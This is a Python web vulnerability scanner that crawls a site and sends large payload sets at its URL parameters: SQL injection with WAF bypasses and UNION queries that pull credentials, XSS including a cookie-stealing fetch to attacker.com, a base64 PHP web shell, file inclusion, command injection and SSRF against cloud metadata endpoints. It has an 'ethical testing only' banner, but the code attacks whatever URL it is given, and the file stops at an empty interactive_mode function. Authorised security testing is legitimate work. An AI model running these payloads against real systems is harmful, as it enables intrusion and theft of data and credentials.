#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
═══════════════════════════════════════════════════════════════════════════
    AUTOMATED WEB VULNERABILITY SCANNER v2.0

    Features:
    ─────────
    ✓ Auto URL crawling & form discovery
    ✓ SQL Injection (Error, Union, Time, Boolean, WAF Bypass)
    ✓ XSS (Reflected, Stored, DOM-based detection)
    ✓ LFI/RFI (Local/Remote File Inclusion)
    ✓ RCE (Remote Code Execution)
    ✓ SSRF (Server-Side Request Forgery)
    ✓ Open Redirect
    ✓ WAF Detection & Bypass
    ✓ Multi-threaded scanning
    ✓ HTML + JSON Report Generation
    ✓ Command-line & Interactive modes

    Just enter URL - rest is automated!
═══════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import time
import json
import re
import threading
import concurrent.futures
import requests
import urllib.parse
import urllib3
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
from html import escape

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════════
# COLORS
# ═════════════════════════════════════════════════════════════════==
class Colors:
    HEADER = '\033[95m'; OKBLUE = '\033[94m'; OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
    ENDC = '\033[0m'; BOLD = '\033[1m'; GRAY = '\033[90m'
    MAGENTA = '\033[35m'; WHITE = '\033[97m'

def c(color, text):
    return f"{color}{text}{Colors.ENDC}"

def banner():
    print(c(Colors.OKGREEN + Colors.BOLD, """
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║   AUTOMATED WEB VULNERABILITY SCANNER v2.0                      ║
    ║              "Just Enter URL - Rest is Automated"               ║
    ╚══════════════════════════════════════════════════════════════════╝""") + c(Colors.OKCYAN, """
    Credit: Syed Rehan  |  Developer: @rehuux
    """) + c(Colors.WARNING, """    For Ethical Security Testing & Educational Purposes Only"""))
    print()

def success(msg): print(c(Colors.OKGREEN, f"[+] {msg}"))
def error(msg):   print(c(Colors.FAIL,    f"[-] {msg}"))
def info(msg):    print(c(Colors.OKCYAN,  f"[*] {msg}"))
def warning(msg): print(c(Colors.WARNING, f"[!] {msg}"))
def separator():  print(c(Colors.GRAY,    "="*70))

def prompt(text):
    return input(c(Colors.OKGREEN, f"[?] {text}: ") + c(Colors.WHITE, ""))


# ═══════════════════════════════════════════════════════════════════
# PAYLOAD DATABASES
# ═════════════════════════════════════════════════════════════════==

# ─── SQL Injection Payloads ───
SQLI_PAYLOADS = {
    "error_based": [
        "'", '"', "`", "\\", "%27", "%22",
        "'--", "'--+-", "'-- -", "#'",
        "' AND 1=1", "' AND 1=2", "' OR '1'='1",
        "' OR 1=1--", "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--", "1' ORDER BY 9999--",
        "' AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x5c,VERSION()),1)--",
        "''", "\\'", "%BF%27", "%2527",
        "' AND 1=1#", "' AND 1=2#", "' OR 1=1#",
    ],
    "time_based": [
        "' AND SLEEP(5)--", "' OR SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' WAITFOR DELAY '0:0:5'--",
        "' AND pg_sleep(5)--",
        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        "' AND (SELECT * FROM (SELECT BENCHMARK(5000000,MD5(1)))a)--",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,database(),3--",
        "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT 1,username,password FROM users--",
        "' UNION SELECT 1,2,version()--",
        "' UNION SELECT 1,2,current_user()--",
    ],
    "boolean_based": [
        "' AND 1=1--", "' AND 1=2--",
        "' OR 1=1--", "' OR 1=2--",
        "' AND 'a'='a", "' AND 'a'='b",
        "' AND ASCII(SUBSTRING((SELECT VERSION()),1,1))>50--",
        "' AND LENGTH(DATABASE())>0--",
    ],
    "auth_bypass": [
        "admin'--", "admin' #", "admin'/*",
        "admin' OR '1'='1", "admin' OR 1=1--",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "') OR '1'='1--", "') OR ('1'='1--",
        "' OR 'x'='x", 'admin"--', 'admin" OR 1=1--',
    ],
    "waf_bypass": [
        "%55%4E%49%4F%4E%20%53%45%4C%45%43%54",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        "' /**/UNION/**/SELECT/**/NULL--",
        "' %0bUNION%0bSELECT%0bNULL--",
        "'/*!50000UNION*//*!50000SELECT*/1,2,3--",
        "'%0AUNION%0ASELECT%0ANULL--",
        "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--",
        "' UNION SELECT 1,2,3 FROM dual--",
        "' DISTINCT UNION SELECT NULL--",
    ],
}

# ─── SQL Error Signatures ───
SQL_ERRORS = {
    "MySQL": [
        "SQL syntax.*MySQL", "Warning.*mysql_", "MySqlException",
        "valid MySQL result", "MySQL.*Driver", "Unknown column",
        "where clause", "mysql_fetch_array", "mysql_num_rows",
        "MySQL server version", "MySQL error",
    ],
    "PostgreSQL": [
        "PostgreSQL.*ERROR", "Warning.*pg_", "PG::Error",
        "PSQLException", "ERROR: parser: parse error at or near",
        "ERROR: syntax error at or near",
    ],
    "MSSQL": [
        "Driver.*SQL[\\-\\_\\ ]*Server", "OLE DB.*SQL Server",
        "Warning.*mssql_", "Microsoft SQL Server.*Error",
        "ODBC SQL Server Driver", "SqlException", "SQLState: 42000",
    ],
    "Oracle": [
        "ORA-", "Oracle error", "Oracle.*Driver",
        "Warning.*oci_", "PLS-",
    ],
    "SQLite": [
        "SQLite/JDBCDriver", "SQLite.Exception",
        "System.Data.SQLite.SQLiteException", "SQLite error",
        "sqlite3.OperationalError",
    ],
    "Generic": [
        "SQL syntax.*error", "syntax error has occurred",
        "incorrect syntax near", "unexpected end of SQL command",
        "Warning: mysql", "unterminated quoted string",
        "quoted string not properly terminated",
        "SQL command not properly ended", "SQLSTATE",
    ]
}

# ─── XSS Payloads ───
XSS_PAYLOADS = [
    "<script>alert(\'XSS\')</script>",
    "<img src=x onerror=alert(\'XSS\')>",
    "<svg onload=alert(\'XSS\')>",
    "javascript:alert(\'XSS\')",
    "<body onload=alert(\'XSS\')>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(\'XSS\') autofocus>",
    "<details open ontoggle=alert(\'XSS\')>",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    "<scr<script>ipt>alert(\'XSS\')</scr</script>ipt>",
    "<marquee onstart=alert(\'XSS\')>",
    "<a href=javascript:alert(\'XSS\')>Click</a>",
    "<object data=javascript:alert(\'XSS\')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror=eval(atob(\'YWxlcnQoJ1hTUycp\'))>",
    "<script>fetch(\'http://attacker.com/?c=\'+document.cookie)</script>",
]

# ─── LFI Payloads ───
LFI_PAYLOADS = [
    "../../../etc/passwd", "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
    "....\\....\\....\\windows\\win.ini",
    "../../../windows/win.ini",
    "../../../proc/self/environ", "../../../proc/self/cmdline",
    "../../../proc/version", "../../../proc/mounts",
    "../../../var/log/apache2/access.log",
    "../../../var/log/nginx/access.log",
    "file:///etc/passwd", "file:///C:/windows/win.ini",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "%00../../../etc/passwd",
    "expect://id", "input://", "phar://",
]

# ─── RCE Payloads ───
RCE_PAYLOADS = [
    ";id", ";whoami", ";uname -a", ";ls -la",
    "|id", "|whoami", "|uname -a",
    "`id`", "`whoami`", "$(id)", "$(whoami)",
    "& id", "&& id", "|| id",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; ping -c 3 127.0.0.1", "; sleep 5",
    "<?php system(\'id\'); ?>",
    "<?php echo shell_exec(\'id\'); ?>",
    ";powershell.exe whoami", "|powershell whoami",
    ";cmd.exe /c whoami", "|cmd /c whoami",
    "$(powershell whoami)",
]

# ─── SSRF Payloads ───
SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost",
    "http://0.0.0.0", "http://[::1]",
    "http://2130706433", "http://0177.0.0.1",
    "http://0x7f.0x0.0x0.0x1", "http://127.1",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:3306/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
]

# ─── Open Redirect Payloads ───
REDIRECT_PAYLOADS = [
    "//evil.com", "\\evil.com",
    "https://evil.com", "http://evil.com",
    "//evil.com/%2f..", "/%09/evil.com",
    "/\\evil.com", "///evil.com",
    "%2f%2fevil.com", "%2f%5cevil.com",
]

# ─── WAF Signatures ───
WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf_clearance"],
    "AWS WAF": ["awselb", "awsalb", "aws-waf", "x-amzn-requestid"],
    "Akamai": ["akamai", "aka-", "x-akamai-transformed"],
    "Incapsula": ["incap_ses", "visid_incap", "incap_"],
    "Sucuri": ["sucuri", "x-sucuri", "sucuri_cloudproxy"],
    "ModSecurity": ["mod_security", "modsecurity", "nosniff"],
    "F5 BIG-IP": ["bigip", "f5", "x-waf-status"],
    "Barracuda": ["barra", "bnpt", "x-barracuda"],
    "Citrix": ["citrix", "ns_af", "ns_id"],
    "Wordfence": ["wordfence", "wf_scan", "x-wf-"],
}


# ═══════════════════════════════════════════════════════════════════
# MAIN SCANNER CLASS
# ═════════════════════════════════════════════════════════════════==

class AutoScanner:
    """Fully Automated Web Vulnerability Scanner"""

    def __init__(self, target_url, threads=10, timeout=10, crawl_depth=2):
        self.target = target_url
        self.threads = threads
        self.timeout = timeout
        self.crawl_depth = crawl_depth
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })

        self.discovered_urls = set()
        self.forms = []
        self.results = {
            "target": target_url,
            "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "waf": None,
            "sqli": [],
            "xss": [],
            "lfi": [],
            "rce": [],
            "ssrf": [],
            "redirect": [],
            "info": [],
            "errors": [],
        }
        self.lock = threading.Lock()

    # ─── URL Helper Methods ───
    def get_base_url(self):
        parsed = urlparse(self.target)
        return f"{parsed.scheme}://{parsed.netloc}"

    def is_same_domain(self, url):
        target_domain = urlparse(self.target).netloc
        url_domain = urlparse(url).netloc
        return target_domain == url_domain or not url_domain

    def normalize_url(self, url, base=None):
        if not base:
            base = self.target
        if url.startswith("//"):
            url = "http:" + url
        if url.startswith(("http://", "https://")):
            return url
        return urljoin(base, url)

    def has_params(self, url):
        return "?" in url and len(parse_qs(urlparse(url).query)) > 0

    # ─── WAF Detection ───
    def detect_waf(self):
        info("Detecting WAF...")
        try:
            test_url = self.target + "?test=<script>alert(1)</script> AND 1=1 UNION SELECT"
            r = self.session.get(test_url, timeout=self.timeout)
            headers = str(r.headers).lower()
            body = r.text.lower()
            combined = headers + body

            detected_wafs = []
            for waf_name, signatures in WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in combined:
                        detected_wafs.append(waf_name)
                        break

            if detected_wafs:
                self.results["waf"] = detected_wafs
                warning(f"WAF Detected: {', '.join(detected_wafs)}")
                for waf in detected_wafs:
                    self.results["info"].append({"type": "WAF Detected", "detail": waf})
            else:
                self.results["waf"] = []
                info("No WAF detected")

        except Exception as e:
            self.results["errors"].append(f"WAF detection error: {str(e)}")

    # ─── Web Crawling ───
    def crawl(self, url=None, depth=0):
        if depth > self.crawl_depth:
            return
        if not url:
            url = self.target
        if url in self.discovered_urls:
            return

        self.discovered_urls.add(url)

        try:
            r = self.session.get(url, timeout=self.timeout)
            content = r.text

            # Extract links
            link_pattern = r'href=["\'](.*?)["\']'
            links = re.findall(link_pattern, content, re.IGNORECASE)

            for link in links:
                full_url = self.normalize_url(link, url)
                if self.is_same_domain(full_url) and full_url not in self.discovered_urls:
                    if self.has_params(full_url):
                        self.discovered_urls.add(full_url)
                    if depth < self.crawl_depth:
                        self.crawl(full_url, depth + 1)

            # Extract forms
            self.extract_forms(url, content)
            self.extract_inputs(url, content)

        except Exception:
            pass

    def extract_forms(self, url, content):
        form_pattern = r'<form.*?action=["\'](.*?)["\'].*?>(.*?)</form>'
        forms = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)

        for action, form_content in forms:
            form_url = self.normalize_url(action, url) if action else url
            inputs = re.findall(r'<input.*?name=["\'](.*?)["\'].*?>', form_content, re.IGNORECASE)
            method = re.search(r'method=["\'](.*?)["\']', form_content, re.IGNORECASE)
            method = method.group(1).upper() if method else "GET"

            self.forms.append({"url": form_url, "method": method, "inputs": inputs})

    def extract_inputs(self, url, content):
        input_pattern = r'<input.*?name=["\'](.*?)["\'].*?>'
        inputs = re.findall(input_pattern, content, re.IGNORECASE)

        if inputs and self.has_params(url):
            for inp in inputs:
                test_url = f"{url}&{inp}=test" if "&" in url else f"{url}?{inp}=test"
                if test_url not in self.discovered_urls:
                    self.discovered_urls.add(test_url)

    # ─── SQL Injection Tests ───
    def test_sqli(self, url):
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        base_url = url.split("?")[0]

        for param_name, param_values in params.items():
            original_value = param_values[0]

            for category, payloads in SQLI_PAYLOADS.items():
                for payload in payloads:
                    try:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param_name] = original_value + payload
                        test_url = base_url + "?" + urlencode(test_params)

                        r = self.session.get(test_url, timeout=self.timeout)
                        response_text = r.text

                        # Check for SQL errors
                        for db_type, patterns in SQL_ERRORS.items():
                            for pattern in patterns:
                                if re.search(pattern, response_text, re.IGNORECASE):
                                    vuln = {
                                        "url": url, "parameter": param_name,
                                        "payload": payload,
                                        "type": f"SQL Injection ({category})",
                                        "db_type": db_type,
                                        "evidence": pattern,
                                        "response_length": len(response_text),
                                        "severity": "CRITICAL" if category in ["union_based", "error_based"] else "HIGH"
                                    }
                                    with self.lock:
                                        if vuln not in vulns:
                                            vulns.append(vuln)
                                    break

                        # Time-based check
                        if category == "time_based":
                            start = time.time()
                            r = self.session.get(test_url, timeout=self.timeout+5)
                            elapsed = time.time() - start
                            if elapsed > 4:
                                vuln = {
                                    "url": url, "parameter": param_name,
                                    "payload": payload,
                                    "type": "SQL Injection (Time-Based)",
                                    "db_type": "Unknown",
                                    "evidence": f"Response delayed {elapsed:.2f}s",
                                    "severity": "CRITICAL"
                                }
                                with self.lock:
                                    if vuln not in vulns:
                                        vulns.append(vuln)

                    except Exception:
                        continue

        return vulns

    # ─── XSS Tests ───
    def test_xss(self, url):
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        base_url = url.split("?")[0]

        for param_name, param_values in params.items():
            for payload in XSS_PAYLOADS:
                try:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = base_url + "?" + urlencode(test_params)

                    r = self.session.get(test_url, timeout=self.timeout)
                    response_text = r.text

                    if payload in response_text:
                        is_executed = any(sig in response_text for sig in ["alert(\'XSS\')", "alert(1)", "onerror=", "onload="])
                        vuln = {
                            "url": url, "parameter": param_name,
                            "payload": payload,
                            "type": "XSS (Reflected)" if is_executed else "XSS (Potential)",
                            "evidence": "Payload reflected in response",
                            "executed": is_executed,
                            "severity": "HIGH" if is_executed else "MEDIUM"
                        }
                        with self.lock:
                            if vuln not in vulns:
                                vulns.append(vuln)

                except Exception:
                    continue

        return vulns

    # ─── LFI Tests ───
    def test_lfi(self, url):
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        base_url = url.split("?")[0]

        for param_name, param_values in params.items():
            for payload in LFI_PAYLOADS:
                try:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = base_url + "?" + urlencode(test_params)

                    r = self.session.get(test_url, timeout=self.timeout)
                    response_text = r.text

                    sigs_linux = ["root:x:", "bin:x:", "daemon:x:", "/bin/bash"]
                    sigs_windows = ["[fonts]", "[extensions]", "for 16-bit app support"]
                    sigs_php = ["<?php", "<?="]

                    for sig in sigs_linux:
                        if sig in response_text:
                            vuln = {"url": url, "parameter": param_name, "payload": payload,
                                    "type": "LFI (Linux)", "evidence": sig, "severity": "HIGH"}
                            with self.lock:
                                if vuln not in vulns: vulns.append(vuln)
                            break

                    for sig in sigs_windows:
                        if sig in response_text:
                            vuln = {"url": url, "parameter": param_name, "payload": payload,
                                    "type": "LFI (Windows)", "evidence": sig, "severity": "HIGH"}
                            with self.lock:
                                if vuln not in vulns: vulns.append(vuln)
                            break

                except Exception:
                    continue

        return vulns

    # ─── RCE Tests ───
    def test_rce(self, url):
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        base_url = url.split("?")[0]

        for param_name, param_values in params.items():
            for payload in RCE_PAYLOADS:
                try:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = base_url + "?" + urlencode(test_params)

                    r = self.session.get(test_url, timeout=self.timeout)
                    response_text = r.text

                    for sig in ["uid=", "gid=", "root:", "www-data:", "root@", "administrator"]:
                        if sig in response_text:
                            vuln = {"url": url, "parameter": param_name, "payload": payload,
                                    "type": "RCE (Remote Code Execution)", "evidence": sig, "severity": "CRITICAL"}
                            with self.lock:
                                if vuln not in vulns: vulns.append(vuln)
                            break

                except Exception:
                    continue

        return vulns

    # ─── SSRF Tests ───
    def test_ssrf(self, url):
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        base_url = url.split("?")[0]

        for param_name, param_values in params.items():
            for payload in SSRF_PAYLOADS:
                try:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = base_url + "?" + urlencode(test_params)

                    r = self.session.get(test_url, timeout=self.timeout)
                    response_text = r.text

                    for sig in ["ami-id", "instance-id", "hostname", "127.0.0.1", "localhost"]:
                        if sig in response_text:
                            vuln = {"url": url, "parameter": param_name, "payload": payload,
                                    "type": "SSRF (Server-Side Request Forgery)", "evidence": sig, "severity": "HIGH"}
                            with self.lock:
                                if vuln not in vulns: vulns.append(vuln)
                            break

                except Exception:
                    continue

        return vulns

    # ─── Open Redirect Tests ───
    def test_redirect(self, url):
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        base_url = url.split("?")[0]

        for param_name, param_values in params.items():
            for payload in REDIRECT_PAYLOADS:
                try:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = base_url + "?" + urlencode(test_params)

                    r = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)

                    if r.status_code in [301, 302, 303, 307, 308]:
                        location = r.headers.get("Location", "")
                        if "evil.com" in location or payload.replace("//", "") in location:
                            vuln = {"url": url, "parameter": param_name, "payload": payload,
                                    "type": "Open Redirect", "evidence": f"Redirect to: {location}",
                                    "severity": "MEDIUM"}
                            with self.lock:
                                if vuln not in vulns: vulns.append(vuln)

                except Exception:
                    continue

        return vulns


    # ─── Run Full Scan ───
    def run_scan(self):
        separator()
        info(f"Starting automated scan on: {self.target}")
        info(f"Threads: {self.threads} | Timeout: {self.timeout}s | Crawl Depth: {self.crawl_depth}")
        separator()

        # Step 1: WAF Detection
        self.detect_waf()
        separator()

        # Step 2: Crawl website
        info("Crawling website for URLs and forms...")
        self.crawl()
        info(f"Discovered {len(self.discovered_urls)} URLs and {len(self.forms)} forms")
        separator()

        # Step 3: Filter URLs with parameters
        test_urls = [u for u in self.discovered_urls if self.has_params(u)]
        if not test_urls:
            test_urls = [self.target] if self.has_params(self.target) else []

        if not test_urls:
            warning("No URLs with parameters found. Testing target URL only.")
            test_urls = [self.target]

        info(f"Testing {len(test_urls)} URLs for vulnerabilities...")
        separator()

        # Step 4: Run vulnerability tests with threading
        all_vulns = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for url in test_urls:
                futures.append(executor.submit(self.test_sqli, url))
                futures.append(executor.submit(self.test_xss, url))
                futures.append(executor.submit(self.test_lfi, url))
                futures.append(executor.submit(self.test_rce, url))
                futures.append(executor.submit(self.test_ssrf, url))
                futures.append(executor.submit(self.test_redirect, url))

            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        all_vulns.extend(result)
                except Exception:
                    pass

        # Step 5: Categorize results
        for vuln in all_vulns:
            vtype = vuln.get("type", "").lower()
            if "sql" in vtype:
                self.results["sqli"].append(vuln)
            elif "xss" in vtype:
                self.results["xss"].append(vuln)
            elif "lfi" in vtype:
                self.results["lfi"].append(vuln)
            elif "rce" in vtype:
                self.results["rce"].append(vuln)
            elif "ssrf" in vtype:
                self.results["ssrf"].append(vuln)
            elif "redirect" in vtype:
                self.results["redirect"].append(vuln)

        return self.results

    # ─── Generate HTML Report ───
    def generate_html_report(self, filename="scan_report.html"):
        total_sqli = len(self.results["sqli"])
        total_xss = len(self.results["xss"])
        total_lfi = len(self.results["lfi"])
        total_rce = len(self.results["rce"])
        total_ssrf = len(self.results["ssrf"])
        total_redirect = len(self.results["redirect"])
        total_vulns = total_sqli + total_xss + total_lfi + total_rce + total_ssrf + total_redirect

        all_vulns = self.results["sqli"] + self.results["xss"] + self.results["lfi"] + self.results["rce"] + self.results["ssrf"] + self.results["redirect"]
        critical = sum(1 for v in all_vulns if v.get("severity") == "CRITICAL")
        high = sum(1 for v in all_vulns if v.get("severity") == "HIGH")
        medium = sum(1 for v in all_vulns if v.get("severity") == "MEDIUM")

        waf_html = ", ".join(self.results["waf"]) if self.results["waf"] else "None Detected"

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerability Scan Report - {escape(self.target)}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0a; color: #e0e0e0; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
        .header {{ text-align: center; padding: 40px; background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 15px; margin-bottom: 30px; }}
        .header h1 {{ color: #00ff88; font-size: 2.5em; margin-bottom: 10px; }}
        .header p {{ color: #888; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .stat-card {{ background: #1a1a2e; padding: 25px; border-radius: 10px; text-align: center; border-left: 4px solid; }}
        .stat-card.critical {{ border-color: #ff0040; }}
        .stat-card.high {{ border-color: #ff6600; }}
        .stat-card.medium {{ border-color: #ffcc00; }}
        .stat-card.total {{ border-color: #00ff88; }}
        .stat-card h3 {{ font-size: 2.5em; margin-bottom: 5px; }}
        .stat-card.critical h3 {{ color: #ff0040; }}
        .stat-card.high h3 {{ color: #ff6600; }}
        .stat-card.medium h3 {{ color: #ffcc00; }}
        .stat-card.total h3 {{ color: #00ff88; }}
        .section {{ background: #1a1a2e; padding: 25px; border-radius: 10px; margin-bottom: 20px; }}
        .section h2 {{ color: #00ff88; margin-bottom: 15px; }}
        .vuln-card {{ background: #0f0f1a; padding: 20px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid; }}
        .vuln-card.critical {{ border-color: #ff0040; }}
        .vuln-card.high {{ border-color: #ff6600; }}
        .vuln-card.medium {{ border-color: #ffcc00; }}
        .vuln-card .url {{ color: #00ccff; font-size: 0.9em; word-break: break-all; }}
        .vuln-card .payload {{ background: #0a0a14; padding: 10px; border-radius: 5px; margin: 10px 0; font-family: monospace; color: #ff6600; word-break: break-all; }}
        .vuln-card .evidence {{ color: #ffcc00; font-size: 0.9em; }}
        .badge {{ display: inline-block; padding: 5px 15px; border-radius: 20px; font-size: 0.8em; font-weight: bold; }}
        .badge.critical {{ background: #ff004020; color: #ff0040; }}
        .badge.high {{ background: #ff660020; color: #ff6600; }}
        .badge.medium {{ background: #ffcc0020; color: #ffcc00; }}
        .waf-box {{ background: #0f0f1a; padding: 15px; border-radius: 8px; }}
        .footer {{ text-align: center; padding: 30px; color: #555; margin-top: 30px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Vulnerability Scan Report</h1>
            <p>Target: <strong>{escape(self.target)}</strong></p>
            <p>Scan Time: {self.results["scan_time"]}</p>
            <p>WAF: {escape(waf_html)}</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card critical"><h3>{critical}</h3><p>CRITICAL</p></div>
            <div class="stat-card high"><h3>{high}</h3><p>HIGH</p></div>
            <div class="stat-card medium"><h3>{medium}</h3><p>MEDIUM</p></div>
            <div class="stat-card total"><h3>{total_vulns}</h3><p>TOTAL</p></div>
        </div>
"""

        vuln_types = [
            ("SQL Injection", self.results["sqli"]),
            ("XSS", self.results["xss"]),
            ("LFI", self.results["lfi"]),
            ("RCE", self.results["rce"]),
            ("SSRF", self.results["ssrf"]),
            ("Open Redirect", self.results["redirect"]),
        ]

        for name, vulns in vuln_types:
            if vulns:
                html += f"""        <div class="section"><h2>{escape(name)} ({len(vulns)} found)</h2>
"""
                for vuln in vulns:
                    severity = vuln.get("severity", "MEDIUM").lower()
                    html += f"""            <div class="vuln-card {severity}">
                <span class="badge {severity}">{escape(vuln.get("severity", "MEDIUM"))}</span>
                <p><strong>Type:</strong> {escape(vuln.get("type", "Unknown"))}</p>
                <p class="url"><strong>URL:</strong> {escape(vuln.get("url", ""))}</p>
                <p><strong>Parameter:</strong> <code>{escape(vuln.get("parameter", "N/A"))}</code></p>
                <div class="payload"><strong>Payload:</strong> {escape(vuln.get("payload", ""))}</div>
                <p class="evidence"><strong>Evidence:</strong> {escape(str(vuln.get("evidence", "N/A")))}</p>
            </div>
"""
                html += "        </div>\n"

        if self.discovered_urls:
            html += f"""        <div class="section"><h2>Discovered URLs ({len(self.discovered_urls)})</h2>
            <div class="waf-box">
                {"<br>\n".join(f'<a href="{escape(u)}" style="color:#00ccff;">{escape(u)}</a>' for u in sorted(self.discovered_urls)[:50])}
                {f"<p style='color:#666;margin-top:10px;'>... and {len(self.discovered_urls)-50} more</p>" if len(self.discovered_urls) > 50 else ""}
            </div>
        </div>
"""

        html += f"""        <div class="footer">
            <p>Generated by Auto Scanner v2.0 | Credit: Syed Rehan | @rehuux</p>
            <p>For Ethical Security Testing Only</p>
        </div>
    </div>
</body>
</html>"""

        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        success(f"HTML Report saved: {filename}")
        return filename

    # ─── Generate JSON Report ───
    def generate_json_report(self, filename="scan_report.json"):
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        success(f"JSON Report saved: {filename}")
        return filename

    # ─── Print Summary ───
    def print_summary(self):
        separator()
        print(c(Colors.OKGREEN + Colors.BOLD, "\n                    SCAN SUMMARY"))
        separator()

        total = (len(self.results["sqli"]) + len(self.results["xss"]) + 
                len(self.results["lfi"]) + len(self.results["rce"]) + 
                len(self.results["ssrf"]) + len(self.results["redirect"]))

        print(f"\n  {c(Colors.OKCYAN, 'Target:')} {self.target}")
        print(f"  {c(Colors.OKCYAN, 'URLs Found:')} {len(self.discovered_urls)}")
        print(f"  {c(Colors.OKCYAN, 'Forms Found:')} {len(self.forms)}")
        print(f"  {c(Colors.OKCYAN, 'WAF:')} {', '.join(self.results['waf']) if self.results['waf'] else 'None'}")
        separator()

        if total == 0:
            print(c(Colors.OKGREEN, "\n  No vulnerabilities found!"))
        else:
            print(c(Colors.WARNING, f"\n  Total Vulnerabilities: {total}\n"))

            vuln_types = [
                ("SQL Injection", self.results["sqli"], Colors.FAIL),
                ("XSS", self.results["xss"], Colors.WARNING),
                ("LFI", self.results["lfi"], Colors.OKBLUE),
                ("RCE", self.results["rce"], Colors.FAIL),
                ("SSRF", self.results["ssrf"], Colors.OKCYAN),
                ("Open Redirect", self.results["redirect"], Colors.OKBLUE),
            ]

            for name, vulns, color in vuln_types:
                if vulns:
                    print(f"  {c(color, f'{name}:')} {len(vulns)}")
                    for v in vulns[:5]:
                        print(f"     {c(Colors.GRAY, '-')} {c(Colors.WHITE, v['parameter'])} {c(Colors.GRAY, '->')} {c(Colors.WARNING, v['type'])}")
                    if len(vulns) > 5:
                        print(f"     {c(Colors.GRAY, f'... and {len(vulns)-5} more')}")

        separator()


# ═════════════════════════════════════════════════════════════════==
# MAIN ENTRY POINT
# ═════════════════════════════════════════════════════════════════==

def interactive_mode():
